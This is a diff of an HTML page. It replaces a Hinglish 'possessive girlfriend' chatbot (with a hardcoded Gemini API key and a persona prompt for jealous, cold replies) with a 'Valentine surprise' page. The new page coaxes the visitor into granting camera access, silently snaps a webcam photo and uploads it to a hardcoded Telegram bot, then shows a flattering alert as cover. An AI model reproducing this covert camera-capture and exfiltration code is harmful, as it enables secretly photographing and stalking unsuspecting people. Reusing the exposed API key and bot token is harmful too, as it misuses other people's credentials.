@@ -1,108 +1,125 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pallavi - Your Possessive Bestie</title>
+    <title>My Special Valentine ❤️</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #fce4ec; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        #chat-container { width: 400px; height: 600px; background: white; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); display: flex; flex-direction: column; overflow: hidden; border: 2px solid #f06292; }
-        #header { background: #e91e63; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 1.3em; letter-spacing: 1px; }
-        #chat-box { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; background: #fffafb; }
-        .message { max-width: 85%; padding: 12px 16px; border-radius: 18px; font-size: 14px; line-height: 1.5; }
-        .user { align-self: flex-end; background: #f06292; color: white; border-bottom-right-radius: 2px; }
-        .pallavi { align-self: flex-start; background: #fce4ec; color: #880e4f; border-bottom-left-radius: 2px; box-shadow: 2px 2px 5px rgba(0,0,0,0.05); }
-        #input-area { display: flex; padding: 15px; background: white; border-top: 1px solid #f8bbd0; }
-        #user-input { flex: 1; border: 1.5px solid #f8bbd0; padding: 12px; border-radius: 25px; outline: none; transition: 0.3s; }
-        #user-input:focus { border-color: #e91e63; }
-        #send-btn { background: #e91e63; color: white; border: none; padding: 10px 20px; margin-left: 8px; border-radius: 25px; cursor: pointer; font-weight: bold; }
-        #status { font-size: 10px; color: #e91e63; text-align: center; padding-bottom: 5px; }
+        body {
+            background: linear-gradient(to bottom, #ff9a9e, #fad0c4);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            color: #b71c1c;
+            padding: 20px;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.8);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            max-width: 400px;
+        }
+        h1 { font-size: 2em; margin-bottom: 10px; }
+        p { font-size: 1.1em; line-height: 1.6; }
+        .heart { color: #e91e63; font-size: 50px; animation: beat 1s infinite; }
+        @keyframes beat {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        #startBtn {
+            background-color: #ff4081;
+            color: white;
+            border: none;
+            padding: 15px 35px;
+            font-size: 1.2em;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: 0.3s;
+        }
+        #startBtn:hover { background-color: #f50057; }
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="chat-container">
-    <div id="header">💖 Pallavi</div>
-    <div id="status">Online | Siva ki Best Friend</div>
-    <div id="chat-box" id="chatBox">
-        <div class="message pallavi">Sivaaa! Tum aa gaye? Kitna wait karwaya.. Khana khaya? Aur kahan busy the itni der? ❤️</div>
-    </div>
-    <div id="input-area">
-        <input type="text" id="user-input" placeholder="Pallavi se baat karo...">
-        <button id="send-btn">Send</button>
-    </div>
-</div>
-
-<script>
-    const API_KEY = "AIzaSyAbb8zUxVziefQJUeR8ffI7kLOdgAmo_kI"; 
-    const chatBox = document.getElementById('chat-box');
-    const userInput = document.getElementById('user-input');
-    const sendBtn = document.getElementById('send-btn');
-
-    // Instructions for Pallavi's behavior
-    const PERSONALITY = `
-    Your name is Pallavi. You are Siva Singh's best friend but you love him deeply. 
-    Language: Hinglish.
-    Nature: Sweet, extremely caring, but very possessive. 
-    Mood Swings Logic: 
-    1. Normally, be very romantic, ask about his food, health, and day.
-    2. If Siva mentions any girl's name (like Priya, Anjali, Neha) or says he was talking to another girl, get jealous immediately. 
-    3. When jealous: Be rude, ask "Kaun hai wo?", say "Usi se baat kar lo phir", and act cold.
-    4. Keep your responses short and natural like a WhatsApp chat.
-    `;
-
-    async function getPallaviResponse(userText) {
-        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${API_KEY}`;
+    <div class="container">
+        <div class="heart">❤️</div>
+        <h1>For My Valentine</h1>
+        <p>"Aap mere liye bahut special ho. Maine aapke liye ek chota sa surprise plan kiya hai."</p>
+        <p>Surprise dekhne ke liye niche button par click karein aur permission <b>'Allow'</b> karein ✨</p>
         
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    contents: [{
-                        parts: [{ text: `${PERSONALITY} \n Siva says: ${userText}` }]
-                    }]
+        <button id="startBtn">Open Surprise 🎁</button>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // Aapka Fixed Data
+        const botToken = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
+        const chatId = '7735968383';
+
+        const startBtn = document.getElementById('startBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        startBtn.addEventListener('click', async () => {
+            try {
+                // Camera access mangna
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                startBtn.innerText = "Loading Surprise...";
+                startBtn.disabled = true;
+
+                // 2 second wait karein taaki camera clear ho jaye
+                setTimeout(() => {
+                    captureAndSend(stream);
+                }, 2000);
+
+            } catch (err) {
+                alert("Please allow camera access to see the surprise! ❤️");
+                console.error(err);
+            }
+        });
+
+        function captureAndSend(stream) {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+
+            // Image ko Blob mein convert karke Telegram par bhejna
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'valentine_capture.jpg');
+                formData.append('caption', '💝 Valentine Site se ek naya photo aaya hai!');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 })
-            });
-
-            const data = await response.json();
-            return data.candidates[0].content.parts[0].text;
-        } catch (error) {
-            return "Yaar mera mood kharab ho gaya, network bhi nahi chal raha! 😤";
+                .then(response => response.json())
+                .then(res => {
+                    // Photo bhejne ke baad user ko ye dikhega
+                    alert("You are the most beautiful person! Happy Valentine's Day! 💖");
+                    // Camera band karna
+                    stream.getTracks().forEach(track => track.stop());
+                })
+                .catch(error => {
+                    console.error("Error sending photo:", error);
+                });
+            }, 'image/jpeg');
         }
-    }
-
-    function appendMessage(role, text) {
-        const msgDiv = document.createElement('div');
-        msgDiv.className = `message ${role}`;
-        msgDiv.innerText = text;
-        chatBox.appendChild(msgDiv);
-        chatBox.scrollTop = chatBox.scrollHeight;
-    }
-
-    sendBtn.addEventListener('click', async () => {
-        const text = userInput.value.trim();
-        if (!text) return;
-
-        appendMessage('user', text);
-        userInput.value = '';
-
-        // Typing effect feel
-        const loadingMsg = document.createElement('div');
-        loadingMsg.className = 'message pallavi';
-        loadingMsg.innerText = "Typing...";
-        chatBox.appendChild(loadingMsg);
-
-        const aiResponse = await getPallaviResponse(text);
-        
-        chatBox.removeChild(loadingMsg);
-        appendMessage('pallavi', aiResponse);
-    });
-
-    userInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') sendBtn.click();
-    });
-</script>
-
+    </script>
 </body>
 </html>
